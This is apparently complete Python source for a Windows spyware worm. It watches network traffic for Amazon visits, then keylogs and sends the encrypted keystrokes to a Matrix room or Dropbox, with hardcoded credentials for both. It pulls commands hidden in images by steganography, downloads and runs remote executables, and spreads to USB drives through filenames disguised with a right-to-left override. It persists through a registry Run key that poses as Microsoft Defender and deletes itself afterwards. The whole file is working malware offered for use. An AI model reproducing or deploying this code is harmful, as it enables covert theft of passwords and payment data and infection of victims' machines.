import socket, os, dropbox, pyHook, time, pythoncom, win32con
from cryptography.fernet import Fernet
from ast import literal_eval
from string import ascii_lowercase, ascii_uppercase
from subprocess import Popen 
from shutil import copy
from zipfile import ZipFile
from winreg import QueryValueEx, OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, SetValueEx, REG_SZ
from sys import executable
import requests
from win32api import GetLogicalDriveStrings
from win32file import GetDriveType
from stegano import lsbset
from stegano.lsbset import generators
import schedule
from random import choice, randint
from threading import Thread
from multiprocessing import Process, freeze_support
from matrix_client.client import MatrixClient
from shutil import copyfile

# Part of keylogger, should be declared at the beginning
keysBuffer = '' 

#Checks for updates
def updateCheck(): 

    # checks for hidden messages in an image
    try: 
        # a shortened url so we can change the image location without touching the code
        imgName = dlr('a_shortened_url') 
        # extracts the message from the image
        message = lsbset.reveal(imgName, generators.eratosthenes())
        with open('updts.txt', 'w') as updts:
            updts.write(message)

        # decrypts the message and checks for updates
        decryptedDic = dcryptFunc(message)
        if 'updatelink' in decryptedDic.keys():
            newUpdateName = dlr(decryptedDic['updatelink'])
            unzipped = unZipper(newUpdateName)
            Popen(unzipped)
            selfDestruct()
    # failsafe: in case there was a problem in downloading the image or 
    # extracting the message, use Dropbox
    except:
        acstoken = 'hrd2do9qsvev3az'
        dbx = dropbox.Dropbox(acstoken)
        path = ""
        try:
            # lists all files in a Dropbox folder
            files = dbx.files_list_folder(path, recursive=True) 
            for f in files.entries:
                # if there was 'update' in one of the file names ...
                if 'update' in f.name:
                    # download the file
                    metadata, downloadedFromdbx = dbx.files_download('/'+f.name)
                    # remove carriage returns, space, etc...
                    updatedContents = (downloadedFromdbx.content).strip()
                    # decrypt the message and check for update
                    decryptedDic = dcryptFunc(updatedContents.decode('utf-8'))
                    with open('updts.txt', 'w') as updts:
                        if 'updatelink' in decryptedDic.keys():
                            newUpdateName = dlr(decryptedDic['updatelink'])
                            unzipped = unZipper(newUpdateName)
                            Popen(unzipped)
                            selfDestruct()
                        # if there was no update available, just write the contents to a file
                        else:
                            with open ('updts.txt', 'w') as updts:
                                updts.write(updatedContents.decode('utf-8'))
        # in case both failed, just 'pass' so the program won't exit
        except:
            pass

# sending messages
def sendFunc(msgStr):
    # try to send a message (msgStr) via matrix protocol
    try:
        # try to read the updated credentials from a file received using previous function
        try:
            with open('updts.txt') as updts:
                updates = updts.read()
            decryptedDic = dcryptFunc(updates)
            martixServer = decryptedDic['martixServer']
            username = decryptedDic['username']
            password = decryptedDic['password']
            roomAddr = decryptedDic['roomAddr']
            client = MatrixClient(martixServer)
            token = client.login(username=username, password=password)
            room = client.join_room(roomAddr)
            room.send_text(msgStr)
            client.logoout()
        # if reading from file failed, probably due to file not being available, 
        # connect to matrix server using hardcoded credentials
        except:
            client = MatrixClient("https://matrix.org")
            token = client.login(username="mr_x_hacker:matrix.org", password="harish@123")
            room = client.join_room("!oOYiBymDbQfwGXJuZP:matrix.org") # find it in room's advanced settings
            room.send_text(msgStr)
            client.logoout()
    # if matrix network was not available, like the time it got hacked on April, 2019(!)
    # send the message via Dropbox
    except:
        dropIt(msgStr)

# sends the message via Dropbox
def dropIt(msgstr):
    acstoken = ''
    dbx = dropbox.Dropbox(acstoken)
    botId = random.randint(1000, 1000000)
    botTxtPath = '/' + str(botId) + '.txt'
    dbx.files_upload(msgstr.encode('utf-8'), botTxtPath)

# unzips a password protected archive
def unZipper(filename):
    with ZipFile(filename) as zf:
        global newExeName
        # extract all file names from this archive
        newExeName = [i for i in zf.namelist() if 'exe' in i][0]
        zf.extractall(pwd=b'123')
    os.remove(filename)
    return newExeName

# part of keylogging, returns character representation of an event
def keyConvert(event):
    if(event.Ascii >= 0 and event.Ascii <= 31) or (event.Ascii == 127):
        return '[' + event.Key + ']'
    else:
        return chr(event.Ascii)
# also part of keylogging, converts events to characters and writes them to a file.
def logger(event):
    global keysBuffer
    keysBuffer += keyConvert(event)
    with open('log.txt', 'a+') as f: 
        f.write(str(keysBuffer))
    keysBuffer = ''
    return True
# registers callbacks function and call necessary functions for keylogging
def klogCaller():
    hookObj = pyHook.HookManager()
    hookObj.KeyDown = logger
    hookObj.HookKeyboard()
    pythoncom.PumpMessages() 

# guess what this one does!!! ( :D )
def snifferFunc():
    # for storing the last time keylogger was called
    global lastCalled
    # for storing the time 'amazon.com' is being browsed by the user
    global currTime
    # set to zero so the first time the loop on line 158 can start
    lastCalled = 0
    # create a socket and start listening
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    hostIp = socket.gethostbyname(socket.gethostname())
    s.bind((hostIp, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    # this line is required by multiprocessing module
    if __name__ == '__main__':
        # this is also needed by multiprocessing for scripts that are going to be frozen
        freeze_support()
        while True:
            data = s.recvfrom(65565)[0]
            if 'amazon.com' in str(data):
                # store the current time this loop was called using time from time module
                # which returns something like this: 1550943165.601794
                currTime = time.time() 
                # if the time passed from last time this loop was called greater than 30,
                # meaning at least 30 seconds have passed for keylogging function to be called again
                # this is why we set lastCalled to zero, otherwise we would get an exception
                if currTime - lastCalled > 30:
                    prcss = Process(target=klogCaller)
                    prcss.daemon = True
                    prcss.start()
                    prcss.join(20)
                    # terminate this process after 20 seconds
                    prcss.terminate()
                    with open('log.txt') as logs:
                        keys = logs.read()
                    # encrypt keylogs
                    encryptedLogs = ncryptFunc(str(keys))
                    # send the logs via matrix or Dropbox
                    sendFunc(encryptedLogs)
                    os.remove('log.txt')
                    # now it's a good time to store when this loop was finished
                    # this helps us time keylogger calls 
                    lastCalled = time.time()

# decrypts a string with a custom algorithm
def dcryptFunc(strng):

    lengthString = strng[:20]
    lengthList=[]
    for i in lengthString:
        if i.isdigit():
            lengthList.append(i)
    l = int(lengthList[0]+lengthList[1])
    decKey= strng[20:19+l] + chr(61)
    f = Fernet(decKey)
    tobDecrypted = strng[19+l:]
    decryptedString = f.decrypt(tobDecrypted.encode('utf-8'))
    final_decrptd= literal_eval(decryptedString.decode('utf-8'))
    return final_decrptd

# encrypts a string with a custom algorithm
def ncryptFunc(astring):

    encKey = Fernet.generate_key()
    f = Fernet(encKey)
    encryptedStr = f.encrypt(astring.encode('utf-8'))
    l = str(len(encKey))
    lengthList = []
    for _ in l:
        lengthList.append(_)
    randomStr1 = ''.join(choice(ascii_lowercase+ascii_uppercase) for i in range(9))
    randomStr2 = ''.join(choice(ascii_lowercase+ascii_uppercase) for i in range(9))
    return (randomStr1 + lengthList[0] + randomStr2 + lengthList[1]+
        (encKey).decode('utf-8').strip('=') + (encryptedStr).decode('utf-8'))

# gets removable drives available on a Windows machine
def getRemovableDrives(drive_types=(win32con.DRIVE_REMOVABLE,)):

    driveList = list()
    driveStr = GetLogicalDriveStrings()
    drives = [str(item)+'\\' for item in driveStr.split("\x00")]
    for drv in drives:
        if GetDriveType(drv) in drive_types:
            driveList.append(drv[:3])
    return driveList

# spreads to usb drives
def spreadIt():

    removable_drives = getRemovableDrives()
    currPath = os.getcwd()
    filePath = currPath + '\\' + executable.split("\\")[-1]
    try:
        # lists all files in the current path, looks for a file with 'RIGHT-TO-LEFT OVERRIDE'
        # character and chooses that file. [0] is because it's a list and we can access the
        # first and only one such file name
        jpgFileName = [i for i in os.listdir(currPath) if u'\u202e' in i.decode('utf-8')][0]
        jpgFilePath = currPath + '\\' + jpgFileName 
    except:
        pass
    if len(removable_drives) > 0:
        for pend in removable_drives:
            # in case there was no file with 'RIGHT-TO-LEFT OVERRIDE' in its name
            try:
                copy(jpgFilePath, pend)
            except:
                copy(filePath, pend)
# adds a program at a file path to Windows registry
def add2Registery(filePath):

    runSubKey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with OpenKey(HKEY_LOCAL_MACHINE, runSubKey, 0, KEY_ALL_ACCESS) as regObject:
        try:
            QueryValueEx(regObject, 'MSdefender')
        except:
            SetValueEx(regObject, "MSdefender", 0, REG_SZ, filePath)
# well...
def selfDestruct():

    filename = executable.split("\\")[-1]
    data = '''@echo off
TASKKILL /F /IM "{0}"
break>{0}
DEL -f "{0}"
break>"%~f0" && DEL "%~f0" '''.format(filename)
    with open("MicrosoftUpdate.bat","w") as f:
        f.write(data)
    Popen("MicrosoftUpdate.bat >> NUL",shell=True)

# for downloading files
def dlr(url):

    r = requests.get(url)
    # get possible redirections, this is important if we're downloading from Dropbox
    for res in r.history:
        if '?dl=1' in res.url:
            fname = os.path.basename(res.url)[:-5]
            # we need a break (!), so fname won't be changed in further iterations
            break
        else:
            fname = os.path.basename(r.url)
    with open(fname, "wb") as local_file:
        local_file.write(r.content)
    return fname

# checks if there is an Internet connection available
def conCheck(desfunc):

    if desfunc == 'snf':
        desfunc = snifferFunc
    else:
        desfunc = updateCheck
    connFlag = True
    while connFlag:
        try:
            socket.create_connection(("www.google.com", 80))
            desfunc()
            connFlag = False
        except:
            time.sleep(5) 

# add threading for functions that must be passed to concheck, 
# so we can use sleep method without worry
def threadedConCheck(destFuncStr):
    Thread(target=conCheck, args=(destFuncStr,)).start()

def main():

    curPath = os.getcwd()
    # if we're already home!
    if 'appdata' in curPath.lower(): 

        # snf as in sniffer. Passed to threadedConCheck to start sniffer in another thread    
        threadedConCheck('snf')
        # to schedule threadedConCheck and spreadIt to be run every 60 and 5 minutes
        schedule.every(60).minutes.do(threadedConCheck, 'u')
        schedule.every(5).minutes.do(spreadIt)
        # This is in plain English, almost cannot be called coding!
        while True:
            schedule.run_pending()
    # We're going home!
    else:

        # get user profile
        userProf = os.environ['USERPROFILE']
        # get executable name
        exeName = executable.split("\\")[-1]
        # create a file path for frozen version of this script
        appPath = curPath + '\\' + exeName
        # create a path for destination folder
        dest = userProf.strip() + '\\AppData\\Roaming\\WindowsUpdater23'
        # create 2 destination file names
        destFileName = dest + '\\' + exeName
        destFileName2 = dest + '\\' + 'copied_' + exeName
        os.makedirs(dest)
        # guess what these 2 lines do! This is exactly why EVERYONE loves Python
        copyfile(appPath, dest)
        os.rename(destFileName, destFileName2)
        # try to also copy the image looking application to the destination folder
        try:
            jpgFileName = [i for i in os.listdir(os.getcwd()) if u'\u202e' in i.decode('utf-8')][0]
            jpgPath = curPath + '\\' + jpgFileName
            copy(jpgPath, dest)
        except:
            pass
        add2Registery(destFileName2)
        Popen(destFileName2, cwd=dest)
        # BYE BYE
        selfDestruct()

main()